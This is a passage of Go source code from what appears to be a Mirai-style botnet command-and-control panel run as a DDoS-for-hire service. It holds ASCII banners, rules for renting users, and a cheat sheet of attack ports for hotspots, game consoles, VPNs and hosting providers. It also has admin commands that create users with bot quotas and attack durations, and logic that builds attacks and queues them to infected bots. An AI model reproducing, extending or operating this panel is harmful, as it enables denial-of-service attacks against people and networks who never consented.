            this.conn.Write([]byte("\033[1;90m                                                         \033[90m`'` .$$$$$$c.ee'?$'d$$$$$o.                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                            \033[90m.$$$$$$$$$$$$L,$$$$$$$$$bu                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m.$$$$$$$$$$$$$$$$'?$$$$$P\033[90m::.                                                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90md$$$$$$$$$$$$$$`'  ?$$F\033[90m::::::.                                               \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                          \033[90m.$$$$$$$$$$$$`\033[97mod$bee.\033[90m`` .::::::                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m$$$$$$$$$$$ \033[97mPLo$$$\033[90m:::::::::''                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m'$$$$$$$$$>\033[97m<`uJF$$;\033[90m::''''                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                          \033[1;34m`e``?$$$$PF,\033[97m`$bJJ$$br                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[1;34m$$$$eeee$$$o.\033[97m`????`                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[1;34m`$$$$E?$P$$$$$$$k                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                            \033[1;34m'$$$$bi`?$$$$$$P                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                             \033[1;34m`?$$$$$$ec,`??`                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                               \033[1;34m'$$$$$$$$$$$$:...                                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                 \033[1;34m'?$$$$$$$$P:::$b,.                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[1;34m'?R$$$P;::z$$;$b.                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[93m.zd$$$$bo;'?bJ>;;:u.'?$??;d$$$.                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                     \033[93m.d$$$$$$$$$$$$d$$P?''.uooo,>?$$$                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                     \033[93m4$$$$$$$$$$$$$$`,e$$$$$$$$$$$$$P                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                      \033[93m`?R$$$$$$$$$$`d$$$$$$$$$$$$$$P                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[93m`'''''`  `R$$$$$$$$$$$P'                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                      \033[93m`'??????``                                                              \r\n"))
            continue
        }
        if err != nil || cmd == "owari" || cmd == "OWARI" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[0;96m                  \033[00;37m▒\033[\033[01;30m█████   █     █\033[00;37m░ \033[01;30m▄▄▄       \033[\033[01;30m██▀███   ██▓\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m▒  \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█\033[00;37m░▒\033[\033[01;30m████▄    ▓██ \033[00;37m▒ \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m░  \033[\033[01;30m██\033[00;37m▒▒\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m▒\033[\033[01;30m██  ▀█▄  ▓██ \033[00;37m░\033[\033[01;30m▄█ \033[00;37m▒▒\033[\033[01;30m██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m\033[00;37m▒\033[\033[01;30m██   ██\033[00;37m░░\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m░\033[\033[01;30m██▄▄▄▄██ \033[00;37m▒\033[\033[01;30m██▀▀█▄  \033[00;37m░\033[\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ \033[01;30m████▓\033[00;37m▒░░░\033[01;30m██\033[00;37m▒\033[01;30m██▓  ▓█   ▓██\033[00;37m▒░\033[01;30m██▓\033[00;37m ▒\033[01;30m██\033[00;37m▒░\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ ▒░▒░▒░ ░ \033[01;30m▓\033[00;37m░▒ ▒   ▒▒   \033[01;30m▓\033[00;37m▒\033[01;30m█\033[00;37m░░ ▒\033[01;30m▓\033[00;37m ░▒\033[01;30m▓\033[00;37m░░\033[01;30m▓  \r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m  ░ ▒ ▒░   ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m░ ░ ░ ▒    ░   ░    ░   ▒     ░░   ░  ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m    ░ ░      ░          ░  ░   ░      ░  \r\n"))
            continue
        }
        if err != nil || cmd == "sora" || cmd == "SORA" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("                      \033[01;30m   ██████  \033[00;37m▒\033[01;30m█████   ██▀███   ▄▄▄      \r\n"))
            this.conn.Write([]byte("                       \033[00;37m▒\033[01;30m██    \033[00;37m▒ ▒\033[01;30m██\033[00;37m▒  \033[01;30m██\033[00;37m▒▓\033[01;30m██ \033[00;37m▒ \033[01;30m██\033[00;37m▒▒\033[01;30m████▄    \r\n"))
            this.conn.Write([]byte("                       \033[00;37m░ ▓\033[01;30m██▄   \033[00;37m▒\033[01;30m██\033[00;37m░  \033[01;30m██\033[00;37m▒▓\033[01;30m██ \033[00;37m░\033[01;30m▄█ \033[00;37m▒▒\033[01;30m██  ▀█▄  \r\n"))
            this.conn.Write([]byte("                       \033[00;37m  ▒   \033[01;30m██\033[00;37m▒▒\033[01;30m██   ██\033[00;37m░▒\033[01;30m██▀▀█▄  \033[00;37m░\033[01;30m██▄▄▄▄██ \r\n"))
            this.conn.Write([]byte("                       \033[00;37m▒\033[01;30m██████\033[00;37m▒▒░ \033[01;30m████\033[00;37m▓▒░░\033[01;30m██\033[00;37m▓ ▒\033[01;30m██\033[00;37m▒ ▓\033[01;30m█   \033[00;37m▓\033[01;30m██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("                       \033[01;30m▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░\r\n"))
            this.conn.Write([]byte("                      \033[01;30m ░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░\r\n"))
            this.conn.Write([]byte("                       \033[01;30m░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░   ▒   \r\n"))
            this.conn.Write([]byte("                       \033[01;30m      ░      ░ ░     ░           ░  ░\r\n"))
            continue
        }

        		if err != nil || cmd == "rules" || cmd == "RULES" || cmd == "RULE" || cmd == "rule" {
            this.conn.Write([]byte("\x1b[1;35m 1. NO HITTING GOVERNMENT WEBSITES               \r\n"))
            this.conn.Write([]byte("\x1b[1;35m 2. No sharing accounts                                \r\n"))
            this.conn.Write([]byte("\x1b[1;35m 3. Dont spam attacks                                  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m 4. If something doesnt go down stop trying to hit it  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m 5. No hitting someone for more than a half an hour [1800]  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m If you cant follow these simple rules you wll be banned \r\n"))
            continue
        }

        		if err != nil || cmd == "PORTS" || cmd == "ports" || cmd == "port" || cmd == "PORT" {
            this.conn.Write([]byte("\x1b[1;35m                                                                           \r\n"))
            this.conn.Write([]byte("\x1b[1;35m Hotspot Ports:                      Verizon 4G LTE:                       \r\n"))
            this.conn.Write([]byte("\x1b[1;35m UDP - 1900                          UDP - 53 , 123 , 500 , 4500 , 52428   \r\n"))
            this.conn.Write([]byte("\x1b[1;35m TCP - 2859 , 5000                   TCP - 53                              \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                                                           \r\n"))
			this.conn.Write([]byte("\x1b[1;35m AT&T Wi-Fi Hotspots:                Attack Ports:                         \r\n"))
			this.conn.Write([]byte("\x1b[1;35m TCP - 137 , 138 , 139 , 445 , 8053  699 Great hotspot port                \r\n"))
			this.conn.Write([]byte("\x1b[1;35m UDP - 1434 , 8053 , 8083 , 8084     5060 router reset port                \r\n"))
			this.conn.Write([]byte("\x1b[1;35m                                                                           \r\n"))
			this.conn.Write([]byte("\x1b[1;35m General Ports:                                                            \r\n"))
			this.conn.Write([]byte("\x1b[1;35m Home: 80, 53, 22, 8080                                                    \r\n"))
			this.conn.Write([]byte("\x1b[1;35m Xbox: 3074                                                                \r\n"))
			this.conn.Write([]byte("\x1b[1;35m Playstation: 9307                                                         \r\n"))
			this.conn.Write([]byte("\x1b[1;35m Hotspot: 9286                                                             \r\n"))
			this.conn.Write([]byte("\x1b[1;35m VPN: 7777                                                                 \r\n"))
            this.conn.Write([]byte("\x1b[1;35m NFO: 1192                                                                 \r\n"))  
            this.conn.Write([]byte("\x1b[1;35m OVH: 992                                                                  \r\n"))
			this.conn.Write([]byte("\x1b[1;35m HTTP: 80                                                                  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m HTTP: 443                                                                 \r\n"))
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\033[0mUsername:\033[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[31m(\033[0m-1 for access to all\033[31m)\033[0m:\033[31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[31m(\033[0m-1 for none\033[31m)\033[0m:\033[31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[31m(\033[0m0 for none\033[31m)\033[0m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[31m" + new_un + "\r\n\033[0m- Password - \033[31m" + new_pw + "\r\n\033[0m- Bots - \033[31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[31m" + duration_str + "\r\n\033[0m- Cooldown - \033[31m" + cooldown_str + "   \r\n\033[0mContinue? \033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "deluser" {
            this.conn.Write([]byte("\033[31mUsername: \033[31m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[31m" + rm_un + "?\033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mUsername:\033[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[31m(\033[0m-1 for access to all\033[31m)\033[0m:\033[31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[31m(\033[0m-1 for none\033[31m)\033[0m:\033[31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[31m(\033[0m0 for none\033[31m)\033[0m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[31m" + new_un + "\r\n\033[0m- Password - \033[31m" + new_pw + "\r\n\033[0m- Bots - \033[31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[31m" + duration_str + "\r\n\033[0m- Cooldown - \033[31m" + cooldown_str + "   \r\n\033[0mContinue? \033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m%s [\x1b[1;34m%d\x1b[0;37m]\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37mTotal \x1b[0;37m[\x1b[1;34m%d\x1b[0;37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
